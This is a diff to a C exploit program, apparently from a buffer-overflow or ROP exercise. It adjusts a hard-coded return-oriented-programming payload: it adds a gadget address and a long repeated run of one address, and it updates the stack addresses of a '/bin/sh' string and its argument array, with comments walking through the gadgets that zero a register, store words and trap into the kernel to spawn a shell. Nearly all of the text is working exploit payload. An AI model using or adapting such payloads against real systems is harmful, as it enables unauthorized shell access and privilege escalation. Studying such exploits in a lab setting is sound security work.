@@ -119,6 +119,8 @@ int main(void)
                       "\xaa\xaa\xaa\xaa" // four-byte value 3
                       "\xaa\xaa\xaa\xaa" // four-byte value 2
                       ""
+                      "\x68\x07\xAD\xBB"
+                      "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
                       "\xD4\xBE\xB3\xBB" // 0 out edx
                       "\x22\xA4\xBA\xBB\xEC\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
@@ -126,8 +128,8 @@ int main(void)
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to 3rd param passed to syscall)
                       "\xE5\xB6\xA9\xBB" // trap into kernel followed by
                       "\x01\x01\x01\x01" // dummy value
-                      "\xF8\x28\xBF\xBF" // addy of bin/sh (x) 
-                      "\xF0\x28\xBF\xBF" // addy of y
+                      "\xa8\x2a\xbf\xbf" // addy of bin/sh (x) 
+                      "\xa0\x2a\xbf\xbf" // addy of y
                       "\xAA\xAA\xAA\xAA" // filler for 0 bytes
                       "\xF8\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                       "\x2F\x62\x69\x6E\x2f\x73\x68\x00" // /bin/sh string
